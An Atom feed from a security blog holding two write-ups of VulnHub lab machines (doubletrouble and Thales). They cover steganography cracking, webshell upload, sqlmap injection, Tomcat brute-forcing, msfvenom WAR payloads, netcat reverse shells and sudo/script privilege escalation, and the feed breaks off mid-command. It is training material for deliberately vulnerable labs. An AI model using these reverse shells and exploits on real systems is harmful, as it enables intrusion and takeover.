<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MS02423</title>
  
  <subtitle>MS02423</subtitle>
  <link href="http://ms02423.top/atom.xml" rel="self"/>
  
  <link href="http://ms02423.top/"/>
  <updated>2024-01-31T14:28:40.145Z</updated>
  <id>http://ms02423.top/</id>
  
  <author>
    <name>MS02423</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub靶场之doubletrouble</title>
    <link href="http://ms02423.top/2024/01/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdoubletrouble/"/>
    <id>http://ms02423.top/2024/01/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdoubletrouble/</id>
    <published>2024-01-31T12:03:10.000Z</published>
    <updated>2024-01-31T14:28:40.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>doubletrouble-1<span class="token punctuation">,</span><span class="token number">743</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202048527.png" alt="image-20240131202048527"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202142255.png" alt="image-20240131202142255"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.1.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202325156.png" alt="image-20240131202325156"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202547979.png" alt="image-20240131202547979"></p><p>靶场IP地址为:192.168.1.11</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202514903.png" alt="image-20240131202514903"></p><pre class="line-numbers language-none"><code class="language-none">发现开启了22端口, OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)发现开启了80端口, Apache httpd 2.4.38 ((Debian))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202915403.png" alt="image-20240131202915403"></p><p>扫描到框架是qdPM</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203043423.png" alt="image-20240131203043423"></p><p>我们可以看到是qdPM</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203150497.png" alt="image-20240131203150497"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203556932.png" alt="image-20240131203556932"></p><p>我们扫描到3个目录，我们一个一个进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203328547.png" alt="image-20240131203328547"></p><p>没有任何有用的信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/secret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203444420.png" alt="image-20240131203444420"></p><p>扫描到一个图片，我们先保存下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/template<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203509902.png" alt="image-20240131203509902"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.11 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204018728.png" alt="image-20240131204018728"></p><p>目前，我们掌握的信息是一个qdPM9.1框架和一张图片。</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-查找漏洞"><a href="#1-查找漏洞" class="headerlink" title="1)查找漏洞"></a>1)查找漏洞</h4><p>我们使用msf查找漏洞，查找到一个漏洞，但是需要密码，这个办法行不通。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204241666.png" alt="image-20240131204241666"></p><p>我们使用kali进行查找漏洞，但是漏洞需要密码，还是不行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204542837.png" alt="image-20240131204542837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131205145769.png" alt="image-20240131205145769"></p><h4 id="2-图片隐写"><a href="#2-图片隐写" class="headerlink" title="2)图片隐写"></a>2)图片隐写</h4><p>我们想到前面有一个图片，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131210145045.png" alt="image-20240131210145045"></p><p>使用steghide工具先查看一下图片基本信息,但是需要密码，我们没有密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide <span class="token parameter variable">--info</span> <span class="token string">'/home/kali/桌面/doubletrouble.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212520438.png" alt="image-20240131212520438"></p><p>我们使用stegseek进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stegseek  <span class="token parameter variable">--crack</span> <span class="token string">'/home/kali/桌面/doubletrouble.jpg'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212820945.png" alt="image-20240131212820945"></p><p>看到账号密码，尝试登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212950912.png" alt="image-20240131212950912"></p><p>我们看到登录成功</p><h4 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3)文件上传"></a>3)文件上传</h4><p>我们进行查找，看有没有可以利用的地方，发现这里有上传点</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213144837.png" alt="image-20240131213144837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213051652.png" alt="image-20240131213051652"></p><p>我们上传一句话木马，连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213240845.png" alt="image-20240131213240845"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213329376.png" alt="image-20240131213329376"></p><p>我们可以看到连接成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/uploads/users/197129-MS02423.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213423291.png" alt="image-20240131213423291"></p><h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4)反弹shell"></a>4)反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">nc -e &#x2F;bin&#x2F;bash 192.168.1.9 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213826380.png" alt="image-20240131213826380"></p><h4 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h4><p>使用sudo -l查看该用户是否具有sudo权限，发现awk可以</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213941106.png" alt="image-20240131213941106"></p><p>发现awk可以进行无密码使用sudo操作</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">awk</span> <span class="token string">'BEGIN &#123;system("/bin/bash")&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131214648118.png" alt="image-20240131214648118"></p><p>我们进入root查看，发现没有flag,有一个镜像，我们下载下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131214809105.png" alt="image-20240131214809105"></p><p>我们把靶机复制到uploads目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> doubletrouble.ova /var/www/html/uploads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131215328396.png" alt="image-20240131215328396"></p><p>因为这个镜像我之前就下载下来了，所以这里我们不用探测ip地址了，ip地址为192.168.1.15</p><h1 id="三-第二个镜像"><a href="#三-第二个镜像" class="headerlink" title="三.第二个镜像"></a>三.第二个镜像</h1><p>我们知道ip地址为192.168.1.15,前面的步骤和第一个是一样的，这里我就进行简写</p><h2 id="1-探测端口及服务"><a href="#1-探测端口及服务" class="headerlink" title="1.探测端口及服务"></a>1.探测端口及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131215757699.png" alt="image-20240131215757699"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">发现开启了22端口, OpenSSH <span class="token number">6</span>.0p1 Debian <span class="token number">4</span>+deb7u4 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了80端口, Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-访问web服务"><a href="#2-访问web服务" class="headerlink" title="2.访问web服务"></a>2.访问web服务</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.15<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221025067.png" alt="image-20240131221025067"></p><p>我们看到是一个登录页面，一般登录页面要么爆破，要么进行测试SQL注入，这个只能进行SQL注入。</p><h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3.SQL注入"></a>3.SQL注入</h2><h3 id="1-测试是否存在SQL注入"><a href="#1-测试是否存在SQL注入" class="headerlink" title="1)测试是否存在SQL注入"></a>1)测试是否存在SQL注入</h3><p>首先我们进行抓包</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221312957.png" alt="image-20240131221312957"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221417024.png" alt="image-20240131221417024"></p><p>发现存在SQL注入</p><h3 id="2-爆破数据库"><a href="#2-爆破数据库" class="headerlink" title="2)爆破数据库"></a>2)爆破数据库</h3><p> sqlmap -r ‘&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;MS02423.txt’ –dbs –batch</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221808200.png" alt="image-20240131221808200"></p><p> sqlmap -r ‘&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;MS02423.txt’ -D ‘doubletrouble’ –tables –batch</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221950016.png" alt="image-20240131221950016"></p><p> sqlmap -r ‘&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;MS02423.txt’ -D ‘doubletrouble’ -T ‘users’ –columns –batch</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131222306338.png" alt="image-20240131222306338"></p><p> sqlmap -r ‘&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;MS02423.txt’ -D ‘doubletrouble’ -T ‘users’ -C ‘username,password’ –batch –dump</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131222834208.png" alt="image-20240131222834208"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Thales</title>
    <link href="http://ms02423.top/2024/01/29/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BThales/"/>
    <id>http://ms02423.top/2024/01/29/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BThales/</id>
    <published>2024-01-29T08:30:22.000Z</published>
    <updated>2024-01-30T09:33:09.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Description <span class="token punctuation">:</span> <span class="token keyword">Open</span> your eyes <span class="token operator">and</span> change your perspectiveincludes <span class="token number">2</span> flags<span class="token punctuation">:</span>user<span class="token punctuation">.</span>txt <span class="token operator">and</span> root<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>Telegram<span class="token punctuation">:</span> @machineboy141 <span class="token punctuation">(</span><span class="token keyword">for</span> <span class="token keyword">any</span> hint<span class="token punctuation">)</span>This works better <span class="token keyword">with</span> VIrtualBox rathe <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>thales-1<span class="token punctuation">,</span><span class="token number">749</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163223146.png" alt="image-20240129163223146"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p>Thales靶机在VMware运行会出现bug,所以我们在VirtualBox运行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163328402.png" alt="image-20240129163328402"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，因为我们在VirtualBox运行所以网段发生了变化,网段知道：192.168.1.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.1.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163940132.png" alt="image-20240129163940132"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164229619.png" alt="image-20240129164229619"></p><p>靶场真实ip地址为192.168.1.13</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164045121.png" alt="image-20240129164045121"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>6p1 Ubuntu 4ubuntu0<span class="token punctuation">.</span><span class="token number">5</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">8080</span>端口<span class="token punctuation">,</span>Apache Tomcat <span class="token number">9.0</span><span class="token number">.52</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164342897.png" alt="image-20240129164342897"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164445794.png" alt="image-20240129164445794"></p><p>我们可以看到是Tomcat</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164921542.png" alt="image-20240129164921542"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164819306.png" alt="image-20240129164819306"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.13:8080 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129165342048.png" alt="image-20240129165342048"></p><p>我们扫描到一个登录页面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.13:8080/manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129165606671.png" alt="image-20240129165606671"></p><p>目前，我们掌握的信息是一个tomcat框架和一个登录页面，因为tomcat 有管理登录页面，于是尝试爆破</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-msf爆破"><a href="#1-msf爆破" class="headerlink" title="1)msf爆破"></a>1)msf爆破</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search login tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170544353.png" alt="image-20240129170544353"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170643501.png" alt="image-20240129170643501"></p><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.1.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170723929.png" alt="image-20240129170723929"></p><p>爆破出来一个用户名和密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170810334.png" alt="image-20240129170810334"></p><p> tomcat:role1</p><h4 id="2-登录"><a href="#2-登录" class="headerlink" title="2)登录"></a>2)登录</h4><p>我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170852364.png" alt="image-20240129170852364"></p><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h4><p>我们可以看到&#x2F;shell和上传页面，那么我们进行shell,在 web 应用程序部署界面尝试在上传 war 包反弹 shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129171145361.png" alt="image-20240129171145361"></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.1.9 LPORT&#x3D;666666 -f war -o MS02423.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172804028.png" alt="image-20240129172804028"></p><p>我们进行上传</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172724391.png" alt="image-20240129172724391"></p><p>上传成功后，在应用程序列表中看到已成功部署了 war 后门，点击访问后反弹</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172826998.png" alt="image-20240129172826998"></p><p>我们可以看到反弹成功</p><p>我们进行提权，发现需要密码，我们进行查找</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129173210637.png" alt="image-20240129173210637"></p><h4 id="4-执行脚本"><a href="#4-执行脚本" class="headerlink" title="4)执行脚本"></a>4)执行脚本</h4><p>一般情况下，我们首先去home目录下查看，然后在去&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下查看有没有什么线索，我们看到了thales命令，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161433886.png" alt="image-20240130161433886"></p><p>我们看到了两个txt文件，模式里面提示我们,一个flag在user.txt，一个在root.txt里面，那么我们进行查看user.txt文件，但是需要thales权限，我们查看notes.txt文件，notes.txt 中告诉我们有一个备用脚本在 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">includes <span class="token number">2</span> flags:user.txt and root.txt.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161558059.png" alt="image-20240130161558059"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161920839.png" alt="image-20240130161920839"></p><p>我们去执行这个脚本，但是执行之后却发现没有如何变化</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162200397.png" alt="image-20240130162200397"></p><h4 id="5-ssh-私钥文件"><a href="#5-ssh-私钥文件" class="headerlink" title="5)ssh 私钥文件"></a>5)ssh 私钥文件</h4><p>我们在thales目录下发现了隐藏的.ssh文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162530044.png" alt="image-20240130162530044"></p><p>这样看太难受了，我们进行交互模式进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162852020.png" alt="image-20240130162852020"></p><p>我们可以看到公钥，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130163048702.png" alt="image-20240130163048702"></p><p>我们把它保存下来，用john进行爆破</p><h4 id="6-john爆破"><a href="#6-john爆破" class="headerlink" title="6)john爆破"></a>6)john爆破</h4><p>将私钥文件保存到攻击机，利用 ssh2john 将私钥转化为 john 能处理的 SHA 加密的文件，然后进行爆破，得到密码为 vodka06</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130170943990.png" alt="image-20240130170943990"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171014530.png" alt="image-20240130171014530"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171045172.png" alt="image-20240130171045172"></p><h4 id="7-查看user-txt文件"><a href="#7-查看user-txt文件" class="headerlink" title="7)查看user.txt文件"></a>7)查看user.txt文件</h4><p>我们进行登录thales用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171432515.png" alt="image-20240130171432515"></p><p>我们获取到第一个flag，还有一个flag在root.txt里面，我们进行提权</p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8)提权"></a>8)提权</h4><p>之前我们看到的那个脚本还没有查看内容，现在我们查看一下那个备份文件的代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171752726.png" alt="image-20240130171752726"></p><p>是一个shell文件，并且是能运行命令的，我们是可以编辑的，并且是root用户运行的，我们插入一串反弹shell的命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171844539.png" alt="image-20240130171844539"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 192.168.1.9 5555 